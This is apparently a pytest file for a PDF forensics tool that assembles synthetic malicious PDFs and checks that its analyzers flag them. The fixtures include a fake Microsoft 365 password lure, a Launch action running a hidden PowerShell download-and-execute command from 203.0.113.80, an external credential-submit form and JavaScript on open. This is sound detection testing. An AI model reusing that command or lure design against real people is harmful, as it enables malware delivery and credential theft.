"""PDF block: peepdf, targeted pdf-parser, signatures, QR codes and the own PDF rules."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import pdfkit as pk  # noqa: E402

from docutracex.parsers import pdf, pdf_qr, pdf_tools  # noqa: E402

pytest.importorskip("zxingcpp")
pytest.importorskip("pypdfium2")


def _rules(res):
    return {f["rule"] for f in res["findings"]}


@pytest.fixture(scope="module")
def lure(tmp_path_factory) -> Path:
    data, root, n = pk.lure_pdf(
        ["Microsoft 365", "Your mailbox password expires today.", "Scan the code to keep it."],
        link="https://login-microsoftonline.example.com/verify",
        qr="https://login-microsoftonline.example.com/qr?u=jdoe",
        open_js="app.alert('Loading...');",
        launch=("cmd.exe", "/c powershell -w hidden -c iwr http://203.0.113.80/s.ps1 | iex"),
        submit_url="https://collect.example.net/pw.php",
        embedded=("invoice.js", b"WScript.Echo(1);"))
    data = pk.incremental_update(
        data, {n + 1: "<< /S /JavaScript /JS (app.launchURL\\('http://203.0.113.80/u'\\)) >>",
               root: f"<< /Type /Catalog /Pages 2 0 R /OpenAction {n + 1} 0 R >>"}, root, n + 2)
    p = tmp_path_factory.mktemp("pdf") / "lure.pdf"
    p.write_bytes(data)
    return p


def test_lure_rules_and_tools(lure: Path) -> None:
    res = pdf_tools.analyze(lure, pdf.analyze(lure))
    assert {"qr_code_url", "form_submits_externally", "launch_command",
            "update_adds_active_content", "phishing_lure_layout"} <= _rules(res)
    assert res["qr"][0]["text"] == "https://login-microsoftonline.example.com/qr?u=jdoe"
    launch = next(f for f in res["findings"] if f["rule"] == "launch_command")
    assert "powershell" in launch["evidence"]
    assert [r["active"] for r in res["revisions"]][1] == ["/JS", "/JavaScript", "/OpenAction"]
    # Tools ran and kept their output; pdf-parser only for keywords present.
    assert res["peepdf"]["versions"] and res["tools"]["peepdf"]["returncode"] == 0
    assert "pdf-parser /Launch" in res["tools"] and "pdf-parser /GoToR" not in res["tools"]
    assert "pdfid -e" in res["tools"]


def test_peepdf_writes_nothing_next_to_the_file(lure: Path) -> None:
    before = set(lure.parent.iterdir())
    pdf_tools.analyze(lure, {})
    assert set(lure.parent.iterdir()) == before


def test_signed_then_modified(tmp_path: Path) -> None:
    pytest.importorskip("pyhanko")
    data, root, _n = pk.lure_pdf(["Invoice 2026-1031", "Amount due: 1,250.00 EUR"])
    data = pk.incremental_update(pk.sign_pdf(data), {500: "<< /S /URI /URI (http://pay.example.org/x) >>"},
                                 root, 501)
    p = tmp_path / "signed.pdf"
    p.write_bytes(data)
    res = pdf_tools.analyze(p, pdf.analyze(p))
    assert res["signatures"] and "Acme Billing" in res["signatures"][0]["signer"]
    assert {"signature_not_covering_file", "modified_after_signing"} <= _rules(res)


# id: gmzpt
def test_clean_pdf_has_no_tool_findings(tmp_path: Path) -> None:
    data, _r, _n = pk.lure_pdf(["Annual report 2025", "Revenue grew 4% year over year."] * 20)
    p = tmp_path / "report.pdf"
    p.write_bytes(data)
    assert pdf_tools.analyze(p, pdf.analyze(p))["findings"] == []


def test_qr_reader_on_plain_image(tmp_path: Path) -> None:
    from PIL import Image

    raw, w, h = pk.qr_png_gray("https://pay.example.org/qr")
    p = tmp_path / "qr.png"
    Image.frombytes("L", (w, h), raw).save(p)
    assert pdf_qr.scan(str(p))["codes"][0]["text"] == "https://pay.example.org/qr"
